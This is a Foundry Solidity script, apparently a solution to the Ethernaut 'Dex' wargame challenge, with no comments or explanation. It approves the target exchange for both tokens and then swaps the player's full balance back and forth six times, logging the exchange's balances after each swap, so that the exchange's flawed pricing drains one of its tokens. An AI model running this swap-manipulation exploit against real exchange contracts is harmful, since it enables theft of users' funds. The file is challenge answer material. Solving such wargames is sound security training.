// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
}

interface IToken {
    function balanceOf(address) external view returns (uint256);
}

contract Solver is Script {
    address dex = vm.envAddress("DEX_INSTANCE");

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV_KEY"));

        address token1 = IDex(dex).token1();
        address token2 = IDex(dex).token2();
        
        token1.call(abi.encodeWithSignature("approve(address,address,uint256)", vm.envAddress("MY_EOA_WALLET"), dex, type(uint256).max));
        token2.call(abi.encodeWithSignature("approve(address,address,uint256)", vm.envAddress("MY_EOA_WALLET"), dex, type(uint256).max));

        IDex(dex).swap(token1, token2, IToken(token1).balanceOf(vm.envAddress("MY_EOA_WALLET")));
        console.log("After 1st Swap");
        console.log("token1.balanceOf(dex)", IToken(token1).balanceOf(dex));
        console.log("token2.balanceOf(dex)", IToken(token2).balanceOf(dex));

        IDex(dex).swap(token2, token1, IToken(token2).balanceOf(vm.envAddress("MY_EOA_WALLET")));
        console.log("After 2nd Swap");
        console.log("token1.balanceOf(dex)", IToken(token1).balanceOf(dex));
        console.log("token2.balanceOf(dex)", IToken(token2).balanceOf(dex));

        IDex(dex).swap(token1, token2, IToken(token1).balanceOf(vm.envAddress("MY_EOA_WALLET")));
        console.log("After 3rd Swap");
        console.log("token1.balanceOf(dex)", IToken(token1).balanceOf(dex));
        console.log("token2.balanceOf(dex)", IToken(token2).balanceOf(dex));

        IDex(dex).swap(token2, token1, IToken(token2).balanceOf(vm.envAddress("MY_EOA_WALLET")));
        console.log("After 4th Swap");
        console.log("token1.balanceOf(dex)", IToken(token1).balanceOf(dex));
        console.log("token2.balanceOf(dex)", IToken(token2).balanceOf(dex));

        IDex(dex).swap(token1, token2, IToken(token1).balanceOf(vm.envAddress("MY_EOA_WALLET")));
        console.log("After 5rd Swap");
        console.log("token1.balanceOf(dex)", IToken(token1).balanceOf(dex));
        console.log("token2.balanceOf(dex)", IToken(token2).balanceOf(dex));

        IDex(dex).swap(token2, token1, 45);
        console.log("After 6th Swap");
        console.log("token1.balanceOf(dex)", IToken(token1).balanceOf(dex));
        console.log("token2.balanceOf(dex)", IToken(token2).balanceOf(dex));

        vm.stopBroadcast();
    }
}
